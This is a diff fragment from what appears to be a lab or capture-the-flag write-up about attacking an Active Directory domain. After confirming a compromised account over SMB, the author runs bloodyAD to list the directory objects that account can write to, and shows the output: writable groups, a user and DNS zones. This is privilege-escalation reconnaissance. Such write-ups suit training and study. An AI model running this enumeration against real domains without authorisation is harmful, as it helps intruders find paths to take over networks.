@@ -857,3 +857,27 @@ SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\sentinel-5Tain
 
 This works, i wonder if these accounts have any interesting permissions
 
+# Enumerating the cre
+
+```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -k get writable                 
+
+distinguishedName: CN=TPM Devices,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=Sentinel Service Account Readers,OU=Sentinels,DC=trask,DC=hsm
+permission: WRITE
+OWNER: WRITE
+
+distinguishedName: CN=sentinel-5TainB,OU=Sentinels,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: DC=trask.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.trask.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+```
